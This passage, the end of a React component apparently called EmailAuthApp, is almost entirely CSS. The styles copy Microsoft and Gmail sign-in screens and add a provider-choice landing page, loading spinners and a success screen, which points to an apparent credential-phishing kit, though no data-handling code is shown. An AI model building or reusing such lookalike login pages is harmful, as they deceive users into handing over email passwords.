          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
        }

        .provider-icon {
          width: 22px;
          height: 22px;
          margin-right: 14px;
          background: white;
          border-radius: 3px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          font-size: 11px;
        }

        .outlook-btn {
          background: #0078d4;
        }

        .office365-btn {
          background: #d83b01;
        }

        .gmail-btn {
          background: #ea4335;
        }

        .landing-footer {
          color: #777;
          text-align: center;
          font-size: 12px;
          margin-top: 40px;
          line-height: 1.6;
        }

        /* Microsoft Auth Styles */
        .ms-container {
          background: #ffffff;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
          position: relative;
        }

        .ms-card {
          background: white;
          padding: 44px 44px 36px;
          max-width: 440px;
          width: 100%;
        }

        .ms-logo {
  display: flex;
  align-items: center;
  margin-bottom: 16px;
}

.ms-logo-icon {
  display: flex;
  align-items: center;
  margin-right: 10px;
}

.ms-logo-squares {
  display: grid;
  grid-template-columns: repeat(2, 11px);
  grid-template-rows: repeat(2, 11px);
  gap: 1px;
}

.ms-square {
  width: 11px;
  height: 11px;
}

.ms-logo-text {
  font-size: 21px;
  font-weight: 600;
  color: #5e5e5e;
  letter-spacing: -0.3px;
}

        .ms-title {
          font-size: 21px;
          font-weight: 600;
          color: #1b1b1b;
          margin-bottom: 10px;
          letter-spacing: -0.5px;
        }

        .ms-subtitle {
          font-size: 15px;
          font-weight: 400;
          color: #1b1b1b;
          margin-bottom: 28px;
        }

        .ms-input {
          width: 100%;
          padding: 11px 10px;
          font-size: 15px;
          border: none;
          border-bottom: 1px solid #605e5c;
          outline: none;
          color: #1b1b1b;
          background: transparent;
          margin-bottom: 6px;
          font-family: 'Segoe UI', sans-serif;
        }

        .ms-input:focus {
          border-bottom: 2px solid #0078d4;
          padding-bottom: 10px;
        }

        .ms-input::placeholder {
          color: #a19f9d;
          font-weight: 400;
        }

        .ms-link {
          color: #0067b8;
          text-decoration: none;
          font-size: 13px;
          font-weight: 400;
          display: inline-block;
          margin-top: 16px;
        }

        .ms-link:hover {
          text-decoration: underline;
        }

        .ms-button {
          background: #0067b8;
          color: white;
          border: none;
          padding: 8px 28px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          float: right;
          margin-top: 28px;
          transition: background 0.2s ease;
        }

        .ms-button:hover:not(:disabled) {
          background: #005a9e;
        }

        .ms-button:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .ms-options {
          background: white;
          border: 1px solid #8a8886;
          padding: 11px 14px;
          margin-top: 20px;
          display: flex;
          align-items: center;
          cursor: pointer;
          max-width: 440px;
          width: 100%;
          transition: background 0.2s ease;
        }

        .ms-options:hover {
          background: #f3f2f1;
        }

        .ms-key-icon {
          width: 20px;
          height: 20px;
          margin-right: 10px;
          color: #1b1b1b;
        }

        .ms-options-text {
          color: #1b1b1b;
          font-size: 15px;
          font-weight: 400;
        }

        .ms-footer {
          background: transparent;
          padding: 20px 16px;
          position: absolute;
          bottom: 0;
          left: 0;
          right: 0;
          display: flex;
          align-items: center;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 16px;
        }

        .ms-footer-links {
          display: flex;
          gap: 24px;
        }

        .ms-footer-link {
          color: #605e5c;
          text-decoration: none;
          font-size: 12px;
          font-weight: 400;
        }

        .ms-footer-link:hover {
          text-decoration: underline;
        }

        .ms-footer-info {
          font-size: 12px;
          color: #605e5c;
        }

        .ms-info-link {
          color: #0067b8;
          text-decoration: none;
        }

        .ms-info-link:hover {
          text-decoration: underline;
        }

        /* Gmail Auth Styles */
       /* Gmail Auth Styles */
.gmail-container {
  background: #ffffff;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  padding: 0;
  position: relative;
}

.gmail-content {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: flex-start;
  max-width: 450px;   
  width: 100%;
  margin: 0 auto;
  padding: 72px 40px 48px;   
}

        .gmail-logo {
  width: 40px;
  height: 40px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
}
  
        .gmail-title {
  font-size: 24px;
  font-weight: 500;
  color: #202124;
  margin-bottom: 8px;
  letter-spacing: 0;
}

        .gmail-subtitle {
          font-size: 16px;
          font-weight: 400;
          color: #202124;
          margin-bottom: 26px;
          letter-spacing: 0;
        }

        .gmail-input-wrapper {
          width: 100%;
          margin-bottom: 26px;
        }

        .gmail-input {
          width: 100%;
          padding: 13px 15px;
          font-size: 16px;
          font-weight: 400;
          color: #202124;
          background: transparent;
          border: 1px solid #dadce0;
          border-radius: 4px;
          outline: none;
          font-family: 'Segoe UI', sans-serif;
          transition: border 0.2s ease;
        }

        .gmail-input:hover {
          border: 1px solid #202124;
        }

        .gmail-input:focus {
          border: 2px solid #1a73e8;
          padding: 12px 14px;
        }

        .gmail-input::placeholder {
          color: #5f6368;
          font-weight: 400;
        }

        .gmail-link {
          color: #1a73e8;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
          display: inline-block;
          margin-bottom: 26px;
        }

        .gmail-link:hover {
          text-decoration: underline;
        }

        .gmail-info {
          font-size: 14px;
          font-weight: 400;
          color: #5f6368;
          margin-bottom: 26px;
          line-height: 1.4;
        }

        .gmail-actions {
          width: 100%;
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-top: 26px;
        }

        .gmail-button {
          background: #1a73e8;
          color: #ffffff;
          border: none;
          padding: 9px 24px;
          font-size: 14px;
          font-weight: 500;
          border-radius: 4px;
          cursor: pointer;
          transition: background 0.2s ease;
          letter-spacing: 0.25px;
        }

        .gmail-button:hover:not(:disabled) {
          background: #1765cc;
          box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .gmail-button:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .gmail-footer {
          padding: 20px 0;
          display: flex;
          justify-content: space-between;
          align-items: center;
          max-width: 450px;
          width: 100%;
          margin: 0 auto;
        }

        .gmail-footer-left {
          display: flex;
          align-items: center;
          gap: 16px;
        }

        .gmail-footer-select {
          background: transparent;
          color: #5f6368;
          border: none;
          font-size: 12px;
          cursor: pointer;
          outline: none;
          font-weight: 400;
        }

        .gmail-footer-right {
          display: flex;
          gap: 32px;
        }

        .gmail-footer-link {
          color: #5f6368;
          text-decoration: none;
          font-size: 12px;
          font-weight: 400;
        }

        .gmail-footer-link:hover {
          color: #202124;
        }

        .gmail-account-selector {
          display: flex;
          align-items: center;
          padding: 12px 16px;
          border: 1px solid #dadce0;
          border-radius: 8px;
          margin-bottom: 26px;
          cursor: pointer;
          width: 100%;
          transition: background 0.2s ease;
        }

        .gmail-account-selector:hover {
          background: #f8f9fa;
        }

        .gmail-account-icon {
          width: 32px;
          height: 32px;
          background: #ea4335;
          border-radius: 50%;
          margin-right: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-size: 15px;
          font-weight: 500;
        }

        .gmail-account-email {
          color: #202124;
          font-size: 14px;
          font-weight: 400;
          flex: 1;
        }

        .gmail-dropdown-icon {
          color: #5f6368;
          font-size: 20px;
        }

        .gmail-password-group {
          width: 100%;
          margin-bottom: 20px;
        }

        .gmail-password-label {
          display: block;
          color: #5f6368;
          font-size: 12px;
          margin-bottom: 26px;
          border: 1px solid #dadce0;
          padding: 16px 15px;
          border-radius: 4px;
          position: relative;
          transition: border 0.2s ease;
        }

        .gmail-password-label:hover {
          border: 1px solid #202124;
        }

        .gmail-password-label:focus-within {
          border: 2px solid #1a73e8;
          padding: 15px 14px;
        }

        .gmail-password-label-text {
          position: absolute;
          top: -9px;
          left: 12px;
          background: #ffffff;
          padding: 0 4px;
          font-size: 12px;
          font-weight: 400;
          color: #5f6368;
        }

        .gmail-password-input {
          width: 100%;
          background: transparent;
          border: none;
          outline: none;
          color: #202124;
          font-size: 16px;
          font-weight: 400;
          font-family: 'Segoe UI', sans-serif;
        }

        .gmail-checkbox-group {
          display: flex;
          align-items: center;
          margin-bottom: 26px;
        }

        .gmail-checkbox {
          margin-right: 10px;
          width: 18px;
          height: 18px;
          cursor: pointer;
          accent-color: #1a73e8;
        }

        .gmail-checkbox-label {
          color: #202124;
          font-size: 14px;
          font-weight: 400;
          cursor: pointer;
        }

        /* Loading Screen */
        .gmail-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          min-height: 60vh;
        }

        .spinner {
          width: 48px;
          height: 48px;
          border: 4px solid #e8eaed;
          border-top-color: #1a73e8;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .loading-text {
          color: #202124;
          font-size: 16px;
          font-weight: 400;
          margin-bottom: 8px;
        }

        .loading-subtext {
          color: #5f6368;
          font-size: 14px;
          font-weight: 400;
        } 

        /* Success Screen */
        .success-container {
          background: linear-gradient(180deg, #2a2a2a 0%, #1a1a1a 100%);
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .success-card {
          background: #2d2d2d;
          border-radius: 12px;
          padding: 56px 48px;
          max-width: 440px;
          width: 100%;
          text-align: center;
        }

        .success-icon {
          width: 80px;
          height: 80px;
          background: #2e7d32;
          border-radius: 50%;
          margin: 0 auto 28px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .checkmark {
          color: white;
          font-size: 48px;
          font-weight: bold;
        }

        .success-title {
          color: #ffffff;
          font-size: 26px;
          font-weight: 600;
          margin-bottom: 14px;
          letter-spacing: -0.3px;
        }

        .success-subtitle {
          color: #b0b0b0;
          font-size: 15px;
          font-weight: 400;
          margin-bottom: 36px;
          line-height: 1.4;
        }

        .success-button {
          background: #2e7d32;
          color: white;
          border: none;
          padding: 14px 32px;
          font-size: 16px;
          font-weight: 600;
          border-radius: 8px;
          cursor: pointer;
          width: 100%;
          transition: background 0.2s ease;
        }

        .success-button:hover {
          background: #1b5e20;
        }

        .clearfix::after {
          content: "";
          display: table;
          clear: both;
        } 


        /* Full Screen Loading */
.full-screen-loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: linear-gradient(180deg, #2a2a2a 0%, #1a1a1a 100%);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.loading-content-center {
  text-align: center;
}

.loading-brand {
  margin-bottom: 48px;
}

.brand-text {
  font-size: 52px;
  font-weight: 700;
  color: white;
  font-family: 'Segoe UI', sans-serif;
  letter-spacing: -1px;
}

.brand-post {
  font-size: 13px;
  color: #888;
  letter-spacing: 4px;
  text-transform: uppercase;
  margin-top: 4px;
}

.loading-spinner-main {
  width: 60px;
  height: 60px;
  border: 4px solid #404040;
  border-top-color: #2e7d32;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto;
}

      `}</style>
      
   </div>  
  );       
};       

export default EmailAuthApp;